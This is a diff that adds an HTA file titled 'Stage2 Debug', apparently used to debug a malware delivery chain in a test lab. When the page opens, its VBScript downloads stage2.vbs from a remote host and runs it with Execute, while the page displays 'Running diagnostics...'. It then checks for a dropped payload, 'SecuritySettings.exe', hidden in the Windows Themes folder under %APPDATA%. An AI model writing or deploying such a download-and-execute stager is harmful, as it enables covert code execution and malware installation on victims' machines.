@@ -1,0 +1,74 @@
+<html>
+<head>
+<title>Stage2 Debug</title>
+<HTA:APPLICATION ID="dbg" WINDOWSTATE="normal" SHOWINTASKBAR="yes" />
+<script language="VBScript">
+Sub Window_OnLoad
+    Dim sURL : sURL = "http://upload.testlab.local/uploads/stage2.vbs"
+    Dim out  : out  = ""
+
+    ' Step 1: HTTP download
+    On Error Resume Next
+    Dim xhr : Set xhr = CreateObject("MSXML2.XMLHTTP")
+    xhr.Open "GET", sURL, False
+    xhr.Send
+    If Err.Number <> 0 Then
+        MsgBox "[FAIL] CreateObject/XMLHTTP: " & Err.Description
+        Exit Sub
+    End If
+    On Error GoTo 0
+
+    out = out & "HTTP status : " & xhr.Status & vbCrLf
+    out = out & "Content-Type: " & xhr.getResponseHeader("Content-Type") & vbCrLf
+    out = out & "Length      : " & Len(xhr.responseText) & " chars" & vbCrLf
+    out = out & "First 80    : " & Left(xhr.responseText, 80) & vbCrLf & vbCrLf
+
+    If xhr.Status <> 200 Then
+        MsgBox "[FAIL] HTTP " & xhr.Status & vbCrLf & out
+        Exit Sub
+    End If
+
+    ' Step 2: Execute
+    Dim sCode : sCode = xhr.responseText
+
+    ' Strip UTF-8 BOM if present (EF BB BF -> shows as 3 garbage chars)
+    If Left(sCode, 1) = Chr(239) Or Asc(Left(sCode,1)) > 127 Then
+        Dim i : i = 1
+        Do While i <= Len(sCode) And Asc(Mid(sCode,i,1)) > 127
+            i = i + 1
+        Loop
+        sCode = Mid(sCode, i)
+        out = out & "[INFO] Stripped " & (i-1) & " BOM bytes" & vbCrLf
+    End If
+
+    On Error Resume Next
+    Execute sCode
+    If Err.Number <> 0 Then
+        out = out & "[FAIL] Execute error " & Err.Number & ": " & Err.Description & vbCrLf
+        MsgBox out
+        Exit Sub
+    End If
+    On Error GoTo 0
+
+    out = out & "[OK] Execute completed without error" & vbCrLf
+
+    ' Step 3: Check drop file
+    Dim oSh2 : Set oSh2 = CreateObject("WScript.Shell")
+    Dim sDir2 : sDir2 = oSh2.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Themes\"
+    Dim sDrop2 : sDrop2 = sDir2 & "SecuritySettings.exe"
+    Dim fso2 : Set fso2 = CreateObject("Scripting.FileSystemObject")
+    If fso2.FileExists(sDrop2) Then
+        out = out & "[OK] Drop file exists: " & sDrop2 & vbCrLf
+        out = out & "     Size: " & fso2.GetFile(sDrop2).Size & " bytes" & vbCrLf
+    Else
+        out = out & "[FAIL] Drop file NOT found: " & sDrop2 & vbCrLf
+    End If
+
+    MsgBox out
+End Sub
+</script>
+</head>
+<body style="font-family:Consolas; padding:20px;">
+    <p>Running diagnostics...</p>
+</body>
+</html>
